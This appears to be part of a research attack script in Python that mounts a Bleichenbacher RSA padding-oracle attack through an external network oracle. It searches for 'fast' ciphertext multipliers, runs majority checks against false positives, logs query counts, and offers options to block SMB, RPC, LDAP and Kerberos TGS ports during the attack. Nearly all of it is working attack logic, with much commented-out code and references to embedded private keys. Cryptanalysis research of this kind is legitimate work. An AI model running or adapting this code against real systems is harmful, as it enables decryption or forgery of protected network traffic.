        #new_message = b"l|\xd0\x08x[\x17\xbc\xe1\x0bE\tg\x9b\x82\xc8\xb4\x04\x95ye>\x0f\xd5\xd9\x8dik\x9f\x967\x12 \xa5\x16\xdd\x97\x9b\x98\x96U'\xf8R\x95\xe6\x1cP\xab\x9e;B\x7f\x12\x05\xc0g\xb8\x98\x02\xe8\x96\xfa\x10\x08I\xb9\xa6/\xe5\xd6P\xe3\x98u\xbc(\xe9\xab \xdc\xc8\xaf\xfb(\x19:\xb6\xa3?r\x1c5G\x16Kt\x86{\xf6sc\x88\x99\xb3\xaa\x07\x1e\xf6\xf8\xb0ORg\x08m\xc2L-/\xc7\x05\x8aE\xd0\xeb\xd1\x11\x15\xaa\rIWB\xe2\xa6BMk\xc6\x18\x8d\x89H\x0b\xd6\x83C\xcbu\xc4.\xeb[\xe1\t\x84F\x8ct\xe6\xd9{\x003r\xe0c\x1e\xd7mAk\xe8bR\x08,\x10q\xe8,\x88\xb8\xc7<\x07\x91\x80F\xeb>9\x93j\xe4\xc2\xb5_\x8b\xbc\xeb\x1d\x8d'\xbc\x1a\xedG!\xf9\xb5\xcf|\x99*\xe6\x98\x07\xd4>z\xba\x149u`}{\xd1?\xf5\xbf\xab/\xb9\xb4R\x1b\xecKD\x1d\x12Y\xb8\xc0\x08\x7f\x83\xcc\x1eto\xe76"#input("Enter possible fast-->")
        #new_cy = new_message#eval(new_message)
        #c0 = bytes_to_long(new_cy)
        #m0 = pow(c0, lala_d, lala_n)
        #padding_oracle_ext_with_comparison_first_msg =  my_attack_sim.PaddingOracleAnyLength(onCT=True, externalOracleCall=single_call_external_oracle, onExternal=True, withExternalPosComparison=True, withVal=args.with_val)
        
        #modifier_outfile.write("Getting first messages\n")
        #res = my_attack_sim.find_multiplier(padding_oracle_ext_with_comparison_first_msg, c0, s_min+s_start_after, 5)
        #print("Performed %d iterations\n" %(res[1], ))
        modifier_outfile.flush()
        #found_fast_token = False
        #print("Begin fast detection")
        print(time.time())
        count_not_fast = 0
        count_fast = 0
        count_false_positive = 0
        till_fast = 0
        till_fast_list = []   
        qtill_fast = 0
        qtill_fast_list = [] 
        countfp = 0
        limit_reached_count = 0
        countfp_3k = 0
        count_fast = 0
        falseneg = 0
        fast_msgs_queries = []
        to_write = ""
        #while True:#not found_fast_token:
        #modifier_outfile.write("current state: %d not fast, fast %d, fp %d\nFast list: %s\nFast list average: \n" %( count_not_fast, count_fast, count_false_positive, till_fast_list, ))#np.average(till_fast_list), ))
        #modifier_outfile.write("Average amount of queries for fast messages: %s\n" %(str(fast_msgs_queries), ))
        #till_fast+=1
        #new_message = get_last_msg(modifier_outfile)#input("Enter possible fast-->")
        #new_cy = eval(new_message)
        #c0 = bytes_to_long(new_cy)
        #m0 = pow(c0, lala_d, lala_n)
        print(hex(m0))
        modifier_outfile.write(to_write)
        modifier_outfile.write(str(hex(m0)))
        to_write =""
        modifier_outfile.write("Running attack on ciphertext: %d \nRunning from middle: %s with values %s for A-B set and r_i val %d\nUntil nibble difference %d\n" %(c0, from_diff, str(fromdiffab), fromlastri, until_diff, ))    
        padding_oracle_ext_with_comparison_cur =  my_attack_sim.PaddingOracleAnyLength(onCT=True, externalOracleCall=single_call_external_oracle, onExternal=True, withExternalPosComparison=True, withVal=args.with_val)
        print(time.time())
        before = time.time()
        #set_trace()
        modifier_outfile.write("Now looking for mul running on c0\n")
        modifier_outfile.write(str(c0))
        modifier_outfile.flush()
        
        
        res = my_attack_sim.find_multiplier(padding_oracle_ext_with_comparison_cur, c0, s_min+s_start_after, 5000)#600)#600)00)#1000)#1010)
        modifier_outfile.write("Fast Detection return result: %s\n" %(res, ))
        #set_trace()
        if not res[2]:
            modifier_outfile.write("\nFound possible fast - starting majority check")
            modifier_outfile.write(str(time.time()))
            modifier_outfile.write(str(c0))
            modifier_outfile.flush()
            print("\nFound possible fast - starting majority check")
            print(time.time())
            print(str(c0))
            check_again = padding_oracle_ext_with_comparison_cur.multiply(c0, res[0])
            firstmul = res[1]
            possible = []
            for i in range(4):
                resss = padding_oracle_ext_with_comparison_cur.perform_query(check_again, None)
                
                possible.append(resss)
            modifier_outfile.write("\nPerformed majority check for msg %s\n" %(str(possible), ))
            modifier_outfile.write(str(m0))
            modifier_outfile.flush()
            if (possible.count(0) > 2):
                count_false_positive +=1
                to_write = "Failed with false positive continuing search\n"
                to_write+= str(c0)+"\n"
                res = my_attack_sim.find_multiplier(padding_oracle_ext_with_comparison_cur, c0, s_min+s_start_after+firstmul, 5000-firstmul)#200-firstmul)#600-firstmul)#1000)#1010)
                if res[2]:
                    continue
                else:
                    check_again = padding_oracle_ext_with_comparison_cur.multiply(c0, res[0])
                    firstmul = res[1]
                    possible = []
                    for i in range(4):
                        resss = padding_oracle_ext_with_comparison_cur.perform_query(check_again, None)
                        
                        possible.append(resss)
                    modifier_outfile.write("\nPerformed majority check again for msg %s\n" %(str(possible), ))
                    modifier_outfile.write(str(c0))
                    if (possible.count(0) > 2):
                        count_not_fast +=1
                        modifier_outfile.write("Reached query limit - not fast\n" )
                        continue
            print("found fast")
            qtill_fast+= (firstmul+4)
            till_fast_list.append(till_fast)
            modifier_outfile.write("\nFound fast message %d after %d, %s\n" %(count_fast+1, till_fast, str(till_fast_list), ))  
            modifier_outfile.flush()
            till_fast=0
            qtill_fast_list.append(qtill_fast)
            qtill_fast = 0
            #count_fast += 1#, withExternalAndComparisonNoWait=True
            #padding_oracle_ext_with_comparison2 =  my_attack_sim.PaddingOracleAnyLength(onCT=False, externalOracleCall=prob_oracle1, onExternal=True, withVal=True)

            #padding_oracle_sim = my_attack_sim.PaddingOracleAnyLength()
            #if not resss:
                            
               
            count_fast +=1
            to_write = ""#"Detected a fast token\n" + str(time.time()-before)+ 
            #modifier_outfile.write("Detected a fast token\n")
            modifier_outfile.write(str(time.time()-before))
            modifier_outfile.write("Running attack on ciphertext: %d \nRunning from middle: %s with values %s for A-B set and r_i val %d\nUntil nibble difference %d\n" %(c0, from_diff, str(fromdiffab), fromlastri, until_diff, ))
            res = my_attack_sim.simulate_attack_with_message(msg=c0, padding_oracle=padding_oracle_ext_with_comparison, from_diff=from_diff, fromdiffab=fromdiffab, fromlastri=fromlastri, until_diff=until_diff, s_start = s_min+s_start_after+firstmul-3)#28)#29)
            if res:
                print(res)

            modifier_outfile.write("Attack return result: %s\n" %(res, ))
            modifier_outfile.write(str(padding_oracle_ext_with_comparison.qcount) +" queries and first multiplier at %d\n" %(firstmul, ))
            modifier_outfile.flush()
            fast_msgs_queries.append(padding_oracle_ext_with_comparison.qcount)
            output_test_results(modifier_outfile, padding_oracle_ext_with_comparison, res)
        # else:
            # count_not_fast +=1
            # modifier_outfile.write("Reached query limit - not fast\n" )
            # limit_reached_count+=1
            # qtill_fast+= 600#200#qth
            #break
        #set_trace()

        
        #my_attack_sim.simulate_attack_with_message(msg=c0, padding_oracle=padding_oracle_ext_with_comparison_first_msg, , from_diff=from_diff, fromdiffab=fromdiffab, fromlastri=fromlastri, until_diff=until_diff, s_start = s_min+s_start_after)
        #modifier_outfile.write("Running attack on ciphertext: %d \nRunning from middle: %s with values %s for A-B set and r_i val %d\nUntil nibble difference %d\n" %(c0, from_diff, str(fromdiffab), fromlastri, until_diff, ))

    
        #res = my_attack_sim.simulate_attack_with_message(msg=c0, padding_oracle=padding_oracle_ext_with_comparison, from_diff=from_diff, fromdiffab=fromdiffab, fromlastri=fromlastri, until_diff=until_diff, s_start = s_min+s_start_after)#28)#29)
        #if res:
        #    print(res)

        #modifier_outfile.write("Attack return result: %s\n" %(res, ))
        
        #output_test_results(modifier_outfile, padding_oracle_ext_with_comparison, res)
        #modifier_outfile.write("False negatives: %d\nFalse positivies: %d\nCorrect Positives: %d\n Correct Negatives %d\nFalse positive locations: %s" %(padding_oracle_ext_with_comparison.FalseNegatives, padding_oracle_ext_with_comparison.FalsePositives,padding_oracle_ext_with_comparison.CorrectPositives, padding_oracle_ext_with_comparison.CorrectNegatives, str(padding_oracle_ext_with_comparison.FalsePositivesLocation), ))

        #print(padding_oracle_ext_with_comparison.TillNextTrue)#modifier_outfile.write("Till next Potential True: Minimum %d, Max  %d, Mean %d\n" %( min(padding_oracle_ext_with_comparison.TillNextTrue), max(padding_oracle_ext_with_comparison.TillNextTrue), statistics.mean(padding_oracle_ext_with_comparison.TillNextTrue), ))
        #print("False negatives: %d\nFalse positivies: %d\nCorrect Positives %d\nCorrect Negatives %d\n" %(padding_oracle_ext_with_comparison.FalseNegatives, padding_oracle_ext_with_comparison.FalsePositives, padding_oracle_ext_with_comparison.CorrectPositives, padding_oracle_ext_with_comparison.CorrectNegatives, ))


    monitor_oracle.send(b'Q')

   
    mal.close()


    

RSA_seq_nums = []
PKASPkt_list = []

def wait_if_active():
    print("check for active")
    for prev in PKASPkt_list:
        while prev.is_active():
            time.sleep(0.1) #0.5

ATTACK_TYPES = {
    #name: (fromdiff, untildiff, start byte, end byte)
    "first": (False, True, 0, 10),"first100": (False, True, 0, 100),"first200": (False, True, 0, 200),#3), #(False, True, 0, 6), 
    "firstpart": (False, True, 0, 30), "lastpart": (True, False, 220, 256), 
    "middle": (True, True, -1, -1), "firstclose": (False, True, 0, 4), "_firstclose": (False, True, 0, 10), "firstclose2": (False, True, 0, 30), "firstclose25": (False, True, 0, 50), "firstclose3": (False, True, 0, 60),"almostfullclosee": (False, True, 0, 60),"almostfullclose": (False, True, 0, 100),
    "almostfullclose2": (False, True, 0, 150), "almostfullclose3": (False, True, 0, 200), "almostfullclose4": (False, True, 0, 255),
    "first10": (False, True, 0, 10), "last10": (True, False, 246, 256), "last2": (True, False, 254, 256), "full": (False, False, 0, 256),
    #"calib":(False, False, 0,0),
}

def create_parser():
    parser = argparse.ArgumentParser()
    parser.add_argument('--monitor_ip',default="192.168.1.2", required=False)#"192.168.1.112", required=False)#"192.168.1.2", required=False)
    parser.add_argument('--monitor_port',default="1940", required=False) #1919


    #parser.add_argument('-ap', '--attack_part', choices=["firstpart", "endpart", "first10", "firstclose", "last10", "full"], default="last10", required=False)
    parser.add_argument('-at', '--attack_type', choices=ATTACK_TYPES.keys(), default="last10", required=False)
    parser.add_argument('-sb', '--start_byte',default='120')
    parser.add_argument('-eb', '--end_byte',default='121')
    parser.add_argument('-dt', '--delay_time', default='1')
    
    #parser.add_argument('-r', '--repcount',default=REP_COUNT)
    
    #parser.add_argument('count', type=int, default=5)
    parser.add_argument('--is_calib', type=bool,default=False, required=False)
    parser.add_argument('-or2','--is_second_oracle', type=bool,default=False, required=False)
    parser.add_argument('--is_verbose', type=bool,default=False, required=False)
    parser.add_argument('--with_val', type=bool,default=False, required=False)
    

    parser.add_argument('-b135', '--block_135', type=bool,default=False, required=False)
    #smb
    parser.add_argument('-b445','--block_445', type=bool,default=False, required=False)
    #rpc 
    parser.add_argument('-b389','--block_389', type=bool,default=False, required=False)
    parser.add_argument('-b636','--block_636', type=bool,default=False, required=False)
    parser.add_argument('-btgs', '--block_tgs', type=bool,default=False, required=False)    

    parser.add_argument('--is_bla_key', type=bool,default=False, required=False)
    args = parser.parse_args()

    return args

def init_files(monitor_args=None):
    global modifier_outfile_name
    curtime = time.asctime()
    modifier_outfile_name = "resultsnew\\%s_bleichmodifier.txt"  %(curtime.replace(' ','_').replace(':','_'), )
    #modifier_outfiles = []
    for i in range(5):
        modifier_outfile = open(modifier_outfile_name , "w") #+"%d.txt" %(i, )
        #modifier_outfiles.append(modifier_outfile)

    #modifier_outfile = modifier_outfiles[0]
    #modifier_outfile.write("Running attack for: %s at offset %s and %s at offset %s and %s at offset %s\n" %( monitor_args.first_bin, monitor_args.first_offset, monitor_args.second_bin, monitor_args.second_offset, monitor_args.third_bin, monitor_args.third_offset, ))
    modifier_outfile.write("%s\n" %(str(monitor_args), ))
    return modifier_outfile#s


if __name__ == '__main__':
    args = create_parser()
    
    rsa_cipher = create_rsa_cipher(lalaencoded_privatekey)
    if args.is_bla_key:
        rsa_cipher = create_rsa_cipher(bladecoded_privatekey)

    #Options to run part of the attack using a simulated oracle.
    attack_values = ATTACK_TYPES[args.attack_type]
    if args.attack_type == 'middle':
        attack_values = (True, True, int(args.start_byte), int(args.end_byte))
    if args.attack_type == 'firstclose' or args.attack_type == '_firstclose' or args.attack_type == 'firstclose2'or args.attack_type == 'firstclose3' or args.attack_type == 'firstclose25':
        s_start_after = 150 #check
    elif args.attack_type == 'almostfullclose' or args.attack_type == 'almostfullclosee' or args.attack_type == "almostfullclose4":
        s_start_after = 20#150 #check
    else:
        s_start_after = 0
    modifier_outfile_name = ""
    meddler(attack_values, s_start_after, is_calibration=args.is_calib, is_second_oracle=args.is_second_oracle)











    
